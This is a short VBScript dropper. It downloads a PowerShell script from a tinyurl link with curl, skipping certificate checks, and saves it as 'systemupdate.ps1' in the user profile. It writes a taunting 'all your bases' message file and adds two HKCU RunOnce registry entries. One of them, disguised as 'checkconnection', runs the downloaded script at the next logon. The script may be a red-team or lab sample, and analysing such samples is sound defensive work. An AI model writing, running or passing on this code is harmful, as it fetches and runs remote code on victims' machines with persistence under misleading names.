Const HKEY_CURRENT_USER = &H80000001
DIM objFSO, oShell, oReg

Set wshShell = CreateObject( "WScript.Shell" )
UserPro =  wshShell.ExpandEnvironmentStrings( "%userprofile%" )
WshShell.Run "%windir%\system32\curl.exe " & "-L -k https://tinyurl.com/yj2ucetf -o " & UserPro & "\systemupdate.ps1"

Set objFSO=CreateObject("Scripting.FileSystemObject")
outFile= UserPro & "\bases.txt"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.Write "eCh0 aL1 y0uR bA53s aRe b3l0nG t0 u5" & vbCrLf
objFile.Close

strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Microsoft\Windows\CurrentVersion\RunOnce"
strValueName = "BelongToUsMsg"
strExpandedValue = "notepad.exe  %userprofile%\bases.txt " 
oReg.SetExpandedStringValue HKEY_CURRENT_USER,strKeyPath,strValueName,strExpandedValue

strComputer = "."
strKeyPath = "Software\Microsoft\Windows\CurrentVersion\RunOnce"
strValueName = "checkconnection"
strExpandedValue = "powershell  %userprofile%\systemupdate.ps1 " 
oReg.SetExpandedStringValue HKEY_CURRENT_USER,strKeyPath,strValueName,strExpandedValue









